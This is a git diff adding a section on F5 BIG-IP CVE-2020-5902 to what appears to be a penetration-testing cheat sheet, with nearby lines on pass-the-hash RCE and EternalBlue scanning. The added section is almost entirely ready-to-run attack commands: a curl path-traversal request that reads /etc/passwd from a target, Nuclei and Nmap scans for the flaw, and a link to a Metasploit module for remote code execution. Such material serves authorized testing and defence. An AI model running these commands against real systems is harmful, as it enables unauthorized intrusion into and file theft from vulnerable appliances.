@@ -104,6 +104,25 @@ Getting an RCE through pass-the-hash
 
 > The provided screenshots are related to a personnel lab used for the POC test only, be careful when running the exploit on DC in PROD(during an engagement)
 
+## BIGIP F5 CVE-2020-5902
+Check if the target is vulnerable
+```bash
+curl -sk 'https://{host}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
+```
+We can scan the target using Nuclei or Nmap too
+* Nuclei
+https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/CVE-2020-5902.yaml
+```bash
+nuclei -t ~/tool/nuclei/nuclei-templates/cves/CVE-2020-5902.yaml -target https://<IP>
+```
+If multiple hosts are specified use -l argument -> -l bigip-assets.txt
+* Nmap
+```bash
+wget https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
+nmap -p443 {IP} --script=http-vuln-cve2020-5902.nse
+```
+#### BIGIP RCE
+we can use Metasploit Module https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4
 ## Scanning for EternalBlue ms17-010
 ```bash
 bash$ nmap -p445 --script smb-vuln-ms17-010 <target>/24
